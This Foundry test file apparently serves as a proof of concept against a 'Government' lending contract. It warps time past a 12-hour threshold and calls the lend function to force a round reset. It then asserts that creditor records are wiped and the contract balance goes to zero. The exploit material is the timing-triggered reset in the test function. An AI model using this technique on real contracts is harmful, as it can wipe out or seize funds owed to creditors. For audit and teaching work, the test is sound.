// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import "../src/list_dos.sol";

contract GovernmentTest is Test {
    struct GovState {
        uint256 round;
        uint256 profit;
        uint256 creditorAddressesLength;
        uint256 creditorAmountsLength;
        uint256 lastCreditorIndex;
        uint256 lastTime;
        uint256 balance;
    }

    Government gov;
    address deployer = makeAddr("deployer");
    address lender = makeAddr("lender");
    address trigger = makeAddr("trigger");

    function setUp() public {
        vm.deal(deployer, 100 ether);
        vm.deal(lender, 20 ether);
        vm.deal(trigger, 1 ether);

        vm.prank(deployer);
        gov = new Government{value: 10 ether}();
    }

    function testPredictableResetTrigger() public {
        // Create initial loan
        vm.prank(lender);
        gov.lendGovernmentMoney{value: 1 ether}(address(0));
        
        // Move beyond reset threshold
        vm.warp(block.timestamp + 12 hours + 1);
        
        // BEFORE TRIGGER: Capture initial state
        console.log("--- BEFORE-Trigger State ---");
        GovState memory pre;
        pre.round = gov.round();
        pre.profit = gov.profitFromCrash();
        pre.creditorAddressesLength = gov.getCreditorAddresses().length;
        pre.creditorAmountsLength = gov.getCreditorAmounts().length;
        pre.lastCreditorIndex = gov.lastCreditorPayedOut();
        pre.lastTime = gov.lastTimeOfNewCredit();
        pre.balance = address(gov).balance;
        
        console.log("Round: ", pre.round);
        console.log("ProfitFromCrash: ", pre.profit);
        console.log("Creditors Count: ", pre.creditorAddressesLength);
        console.log("Creditors Amounts Count: ", pre.creditorAmountsLength);
        console.log("LastCreditorPayedOut: ", pre.lastCreditorIndex);
        console.log("LastTimeOfNewCredit: ", pre.lastTime);
        console.log("Contract Balance: ", pre.balance);
        
        // Trigger reset
        console.log("--- Trigger Reset ---");
        vm.prank(trigger);
        bool result = gov.lendGovernmentMoney{value: 1 ether}(address(0));
        
        // AFTER TRIGGER: Capture post-state
        console.log("--- AFTER-Trigger State ---");
        GovState memory post;
        post.round = gov.round();
        post.profit = gov.profitFromCrash();
        post.creditorAddressesLength = gov.getCreditorAddresses().length;
        post.creditorAmountsLength = gov.getCreditorAmounts().length;
        post.lastCreditorIndex = gov.lastCreditorPayedOut();
        post.lastTime = gov.lastTimeOfNewCredit();
        post.balance = address(gov).balance;
        
        console.log("Round: ", post.round);
        console.log("ProfitFromCrash: ", post.profit);
        console.log("Creditors Count: ", post.creditorAddressesLength);
        console.log("Creditors Amounts Count: ", post.creditorAmountsLength);
        console.log("LastCreditorPayedOut: ", post.lastCreditorIndex);
        console.log("LastTimeOfNewCredit: ", post.lastTime);
        console.log("Contract Balance: ", post.balance);
        
        // Vulnerability checks
        console.log("--- Vulnerability Checks ---");
        bool roundIncreased = (post.round == pre.round + 1);
        bool profitReset = (post.profit == 0);
        bool creditorsCleared = (post.creditorAddressesLength == 0 && post.creditorAmountsLength == 0);
        bool indexReset = (post.lastCreditorIndex == 0);
        bool timeUpdated = (post.lastTime == block.timestamp);
        bool balanceReset = (post.balance == 0);
        
        console.log("Round increased (+1): ", roundIncreased);
        console.log("Profit reset to zero: ", profitReset);
        console.log("Creditors cleared: ", creditorsCleared);
        console.log("Last creditor index reset: ", indexReset);
        console.log("Last time updated: ", timeUpdated);
        console.log("Contract balance reset to zero: ", balanceReset);
        
        // Final verdict based on core state changes
        if (roundIncreased && profitReset && creditorsCleared && 
            indexReset && timeUpdated) {
            console.log("Vulnerability Exists: Reset was triggered by predictable timing attack");
        } else {
            console.log("Vulnerability not Exist: Reset mechanism did not execute as expected");
        }
        
        // Final state assertions
        assertFalse(result, "Reset transaction should return false");
        assertEq(post.round, pre.round + 1, "Round not incremented");
        assertEq(post.profit, 0, "Crash profits not reset");
        assertEq(post.creditorAddressesLength, 0, "Creditors addresses not cleared");
        assertEq(post.creditorAmountsLength, 0, "Creditors amounts not cleared");
        assertEq(post.lastCreditorIndex, 0, "Last creditor index not reset");
        assertEq(post.lastTime, block.timestamp, "Last credit time not updated");
        assertEq(post.balance, 0, "Contract balance not reset to zero");
    }
}